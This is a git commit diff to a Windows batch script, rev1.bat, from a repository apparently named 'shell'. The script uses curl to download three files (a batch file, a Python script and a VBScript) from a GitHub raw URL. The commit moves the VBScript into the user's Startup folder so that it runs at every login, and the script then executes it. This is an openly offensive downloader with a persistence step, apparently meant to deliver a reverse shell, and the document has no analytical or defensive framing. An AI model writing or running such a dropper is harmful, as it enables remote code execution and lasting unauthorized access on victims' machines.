318f17d054a5abe0b7e0d868ed1a28badb02ea2f
0x2034 <168307322+0x2034@users.noreply.github.com>
2024-05-04 00:20:43 +0300

    Update rev1.bat

--- rev1.bat
+++ rev1.bat
@@ -1,6 +1,6 @@
 @echo off
 curl https://raw.githubusercontent.com/0x2034/shell/main/pro.bat -o %temp%\pro.bat
 curl https://raw.githubusercontent.com/0x2034/shell/main/sh.py -o %temp%\sh.py
-curl https://raw.githubusercontent.com/0x2034/shell/main/post.vbs -o "%%\post.vbs"
+curl https://raw.githubusercontent.com/0x2034/shell/main/post.vbs -o "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\post.vbs"
 
 call "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\post.vbs"
